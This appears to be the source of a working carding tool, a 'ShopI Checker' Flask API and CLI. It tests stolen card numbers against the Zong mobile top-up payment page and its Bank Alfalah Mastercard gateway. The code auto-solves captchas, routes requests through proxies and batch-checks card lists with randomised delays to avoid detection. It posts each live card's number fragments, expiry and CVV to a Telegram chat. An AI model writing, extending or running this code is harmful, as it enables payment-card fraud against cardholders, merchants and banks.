def interpret_mpgs(mpgs_data: dict, mpgs_status: int, used_version: str,
                   card: dict, order_id: str, msisdn: str, amount: str) -> dict:
    """Convert raw MPGS data dict into a final {status, message, ...} response."""
    mpgs_result  = str(mpgs_data.get("result",       ""))
    gateway_code = str(mpgs_data.get("gateway_code") or mpgs_data.get("gatewayCode") or "")
    session_blk  = mpgs_data.get("session") or {}
    update_status = str(session_blk.get("updateStatus", "") if isinstance(session_blk, dict) else "")
    err_blk      = mpgs_data.get("error") or {}
    err_field    = str(err_blk.get("field",       "") if isinstance(err_blk, dict) else "")
    err_expl     = str(err_blk.get("explanation", "") if isinstance(err_blk, dict) else "")
    err_msg      = str(err_blk.get("explanation") or err_blk.get("cause") or ""
                       if isinstance(err_blk, dict) else "")
    is_hpf       = mpgs_data.get("_via") == "hpf"
    three_ds_req = is_hpf and bool(mpgs_data.get("three_ds_req"))

    page_post_ver_err = (mpgs_data.get("_via") == "pagePost" and err_field == "version")
    is_approved  = (mpgs_result in ("SUCCESS", "3DS_REQUIRED") or
                    update_status == "SUCCESS" or
                    gateway_code in _APPROVED_CODES)
    is_declined  = (mpgs_result == "FAILURE" or gateway_code in _DECLINED_CODES)
    is_session_err = (mpgs_result == "ERROR" and
                      bool(re.search(r"Unexpected parameter", err_expl, re.I)))

    if is_approved:
        approved_msg = (
            "Card live — 3DS authentication required (card accepted by MPGS)"
            if three_ds_req
            else "Card accepted by Mastercard gateway"
        )
        masked = f"{card['cc'][:6]}••••••{card['cc'][-4:]}"
        threading.Thread(target=notify_telegram, args=(
            f"✅ <b>ZONG LIVE</b>\n\n"
            f"💳 <b>Card:</b> <code>{masked} {card['mm']}/{card['yy']} {card['cvv']}</code>\n"
            f"📱 <b>MSISDN:</b> <code>{esc_html(msisdn)}</code>\n"
            f"💰 <b>Amount:</b> PKR {esc_html(str(amount))}\n"
            f"🧾 <b>Order:</b> <code>{esc_html(order_id)}</code>\n"
            f"🏦 <b>Gateway:</b> Bank Alfalah · MPGS v{used_version.replace('-page','')}",
        ), daemon=True).start()
        return {
            "status":     "approved",
            "message":    approved_msg,
            "card":       card,
            "order_id":   order_id,
            "mpgs_status": update_status or mpgs_result,
            "version":    used_version,
        }

    if is_declined and not is_session_err:
        return {
            "status":     "declined",
            "message":    err_msg or gateway_code or "Gateway declined card",
            "card":       card,
            "order_id":   order_id,
            "mpgs_status": gateway_code or mpgs_result,
            "version":    used_version,
        }

    if page_post_ver_err:
        return {
            "status":   "error",
            "message":  f"MPGS session version mismatch (v{used_version}) — card not tested",
            "card":     card,
            "order_id": order_id,
            "mpgs_status": "VERSION_ERR",
            "version":  used_version,
        }

    if is_session_err:
        return {
            "status":   "error",
            "message":  f"MPGS session error: {err_expl[:120]}",
            "card":     card,
            "order_id": order_id,
            "mpgs_status": "SESSION_ERR",
            "version":  used_version,
        }

    if not mpgs_result and not update_status:
        return {
            "status":   "error",
            "message":  "Could not match MPGS session version — session may have expired",
            "card":     card,
            "order_id": order_id,
            "version":  used_version,
        }

    if mpgs_status == 401 or re.search(r"authorization required", err_msg, re.I):
        return {
            "status":   "error",
            "message":  f"MPGS gateway requires merchant auth (v{used_version}) — card not tested",
            "card":     card,
            "order_id": order_id,
            "mpgs_status": "AUTH_REQUIRED",
            "version":  used_version,
        }

    return {
        "status":     "declined",
        "message":    err_msg or f"Gateway rejected card (HTTP {mpgs_status})",
        "card":       card,
        "order_id":   order_id,
        "mpgs_status": mpgs_result or str(mpgs_status),
        "version":    used_version,
    }


# ──────────────────────────────────────────────────────────────────────────────
# Core check function (auto-solve)
# ──────────────────────────────────────────────────────────────────────────────

def check_zong(msisdn: str, card_raw: str, amount: str = "100",
               proxy: str | None = None) -> dict:
    """
    Full Zong card check with NopeCHA auto-solve (up to 3 captcha retries).
    Returns {status: "approved"|"declined"|"error", message, ...}.
    """
    card = parse_card(card_raw)
    if not card:
        return {"status": "error", "message": "Invalid card format — use CC|MM|YY|CVV"}
    if not msisdn or not re.match(r"^03\d{9}$", msisdn):
        return {"status": "error", "message": "Invalid MSISDN — must be 03XXXXXXXXX (Zong number)"}

    MAX_RETRIES  = 3
    order_result = None
    return_url   = f"{ZONG_BASE}/Order/PaymentReturn"
    cancel_url   = f"{ZONG_BASE}/Order/PaymentCancel"
    zong_ua      = get_zong_ua()

    for attempt in range(MAX_RETRIES):
        if attempt:
            log.info("Retrying captcha (attempt %d)", attempt + 1)

        try:
            page = fetch_zong_page(proxy)
        except Exception as e:
            return {"status": "error", "message": f"Zong page fetch failed: {e}"}

        extracted  = extract_zong_page(page["html"], page["cookies"])
        csrf       = extracted["csrf"]
        cap_b64    = extracted["captcha_b64"]
        return_url = extracted["return_url"]
        cancel_url = extracted["cancel_url"]
        zong_ua    = page["ua"]
        cookies    = page["cookies"]

        log.info("page: csrf=%s captcha=%s", bool(csrf), bool(cap_b64))

        if not cap_b64:
            return {"status": "error", "message": "Captcha image not found in Zong page"}

        cap = solve_image_captcha(cap_b64)
        if "error" in cap:
            return {"status": "error", "message": f"Captcha solver: {cap['error']}"}
        log.info("captcha solved: %s", cap["text"])

        r = post_create_order(csrf, cookies, msisdn, amount, cap["text"], zong_ua, proxy)
        log.info("CreateOrder ok=%s", r["ok"])

        if r["ok"]:
            order_result = r
            break
        if not r.get("captcha_fail"):
            return {"status": "error", "message": r["message"]}

    if not order_result:
        return {"status": "error", "message": "Order creation failed after captcha retries"}

    merchant_id     = order_result["merchant_id"]
    mpgs_session_id = order_result["mpgs_session_id"]
    checkout_js_url = order_result["checkout_js_url"]
    order_id        = order_result["order_id"]
    order_amount    = order_result["amount"] or amount
    signature       = order_result["signature"]
    gateway_op      = order_result["gateway_op"]

    log.info("order %s | session=%s", order_id, mpgs_session_id)

    result = probe_and_update_mpgs_session(
        merchant_id, mpgs_session_id, checkout_js_url, order_id, order_amount,
        card, return_url, cancel_url, signature, gateway_op, zong_ua,
    )

    return interpret_mpgs(
        result["mpgs_data"], result["mpgs_status"], result["used_version"],
        card, order_id, msisdn, amount,
    )


# ──────────────────────────────────────────────────────────────────────────────
# In-memory session store for manual captcha flow  (5-minute TTL)
# ──────────────────────────────────────────────────────────────────────────────

_sessions: dict[str, dict] = {}
_SESSION_TTL = 5 * 60   # seconds


def _clean_sessions():
    now = time.time()
    expired = [k for k, v in _sessions.items() if v["expires_at"] < now]
    for k in expired:
        del _sessions[k]


# ──────────────────────────────────────────────────────────────────────────────
# Flask API
# ──────────────────────────────────────────────────────────────────────────────

app = Flask(__name__)


@app.route("/", methods=["GET"])
def index():
    return jsonify({"status": "ok", "service": "ShopI Checker"})


@app.route("/api/zong", methods=["POST"])
def zong_auto():
    """
    POST /api/zong
    Auto-solve captcha via NopeCHA (retried up to 3×).

    Body (JSON):
      msisdn   — "03XXXXXXXXX"
      card     — "CC|MM|YY|CVV"
      amount   — "100" (optional, default 100 PKR)
      proxy    — "host:port" or "socks5://host:port" (optional)
    """
    body   = request.get_json(silent=True) or {}
    msisdn = str(body.get("msisdn", "")).strip()
    card   = str(body.get("card",   "")).strip()
    amount = str(body.get("amount", "100")).strip() or "100"
    proxy  = str(body.get("proxy",  "")).strip() or None

    return jsonify(check_zong(msisdn, card, amount, proxy))


@app.route("/api/zong/prepare", methods=["POST"])
def zong_prepare():
    """
    POST /api/zong/prepare
    Fetch Zong page and return the captcha image for manual solving.
    The session is stored server-side for 5 minutes.

    Body (JSON):
      msisdn   — "03XXXXXXXXX"
      amount   — "100" (optional)
      proxy    — optional

    Response:
      { session_id: "...", captcha_b64: "data:image/...;base64,..." }
    """
    body   = request.get_json(silent=True) or {}
    msisdn = str(body.get("msisdn", "")).strip()
    amount = str(body.get("amount", "100")).strip() or "100"
    proxy  = str(body.get("proxy",  "")).strip() or None

    if not msisdn:
        return jsonify({"error": "msisdn is required"}), 400

    try:
        page = fetch_zong_page(proxy)
    except Exception as e:
        return jsonify({"error": f"Zong page fetch failed: {e}"}), 400

    extracted = extract_zong_page(page["html"], page["cookies"])
    if not extracted["captcha_b64"]:
        return jsonify({"error": "Captcha image not found on Zong page — try again"}), 400

    _clean_sessions()
    sid = str(uuid.uuid4())
    _sessions[sid] = {
        "csrf":        extracted["csrf"],
        "cookies":     page["cookies"],
        "msisdn":      msisdn,
        "amount":      amount,
        "ua":          page["ua"],
        "proxy":       proxy,
        "return_url":  extracted["return_url"],
        "cancel_url":  extracted["cancel_url"],
        "expires_at":  time.time() + _SESSION_TTL,
    }

    log.info("session prepared: %s csrf=%s", sid, bool(extracted["csrf"]))
    return jsonify({
        "session_id":   sid,
        "captcha_b64":  f"data:image/png;base64,{extracted['captcha_b64']}",
    })


@app.route("/api/zong/submit", methods=["POST"])
def zong_submit():
    """
    POST /api/zong/submit
    Submit a card using a previously prepared session + manually entered captcha.

    Body (JSON):
      session_id    — from /api/zong/prepare
      captcha_code  — 4-char code typed by user
      card          — "CC|MM|YY|CVV"
    """
    body         = request.get_json(silent=True) or {}
    sid          = str(body.get("session_id",   "")).strip()
    captcha_code = str(body.get("captcha_code", "")).strip()
    card_raw     = str(body.get("card",         "")).strip()

    if not sid or not captcha_code or not card_raw:
        return jsonify({"status": "error", "message": "session_id, captcha_code, and card are required"}), 400

    stored = _sessions.pop(sid, None)   # one-time use
    if not stored or stored["expires_at"] < time.time():
        return jsonify({"status": "error", "message": "Session expired — please call /prepare again"})

    card = parse_card(card_raw)
    if not card:
        return jsonify({"status": "error", "message": "Invalid card format — use CC|MM|YY|CVV"})

    r = post_create_order(
        stored["csrf"], stored["cookies"], stored["msisdn"], stored["amount"],
        captcha_code, stored["ua"], stored["proxy"],
    )
    if not r["ok"]:
        return jsonify({"status": "error", "message": r["message"]})

    merchant_id     = r["merchant_id"]
    mpgs_session_id = r["mpgs_session_id"]
    checkout_js_url = r["checkout_js_url"]
    order_id        = r["order_id"]
    order_amount    = r["amount"] or stored["amount"]
    signature       = r["signature"]
    gateway_op      = r["gateway_op"]

    result = probe_and_update_mpgs_session(
        merchant_id, mpgs_session_id, checkout_js_url, order_id, order_amount,
        card, stored["return_url"], stored["cancel_url"], signature, gateway_op,
        stored["ua"],
    )
    return jsonify(interpret_mpgs(
        result["mpgs_data"], result["mpgs_status"], result["used_version"],
        card, order_id, stored["msisdn"], stored["amount"],
    ))


@app.route("/api/zong/batch", methods=["POST"])
def zong_batch():
    """
    POST /api/zong/batch
    Check multiple cards sequentially (paced with 1-2.5 s delay between each).

    Body (JSON):
      msisdn  — "03XXXXXXXXX"
      cards   — ["CC|MM|YY|CVV", ...]
      amount  — "100" (optional)
      proxy   — optional
    """
    body   = request.get_json(silent=True) or {}
    msisdn = str(body.get("msisdn", "")).strip()
    cards  = body.get("cards") or []
    amount = str(body.get("amount", "100")).strip() or "100"
    proxy  = str(body.get("proxy",  "")).strip() or None

    if not isinstance(cards, list) or not cards:
        return jsonify({"status": "error", "message": "cards must be a non-empty list"}), 400

    results = []
    for card in cards:
        res = check_zong(msisdn, str(card).strip(), amount, proxy)
        results.append(res)
        time.sleep(random.uniform(1.0, 2.5))

    return jsonify({"results": results, "total": len(results)})


# ──────────────────────────────────────────────────────────────────────────────
# CLI mode
# ──────────────────────────────────────────────────────────────────────────────

def _cli():
    args = sys.argv[1:]
    if len(args) < 2:
        print("Usage: python checker.py <msisdn> <CC|MM|YY|CVV> [amount] [proxy]")
        print("Example: python checker.py 03161234567 5178050000007077|01|28|005 100")
        sys.exit(1)
    msisdn = args[0]
    card   = args[1]
    amount = args[2] if len(args) > 2 else "100"
    proxy  = args[3] if len(args) > 3 else None
    result = check_zong(msisdn, card, amount, proxy)
    print(json.dumps(result, indent=2))


if __name__ == "__main__":
    if len(sys.argv) > 1 and not sys.argv[1].startswith("--"):
        _cli()
    else:
        print(f"ShopI Checker API — http://0.0.0.0:{PORT}")
        print("Endpoints:")
        print(f"  POST /api/zong         — auto-solve (NopeCHA)")
        print(f"  POST /api/zong/prepare — get captcha image for manual solve")
        print(f"  POST /api/zong/submit  — submit with manual captcha answer")
        print(f"  POST /api/zong/batch   — batch check")
        app.run(host="0.0.0.0", port=PORT, debug=False)
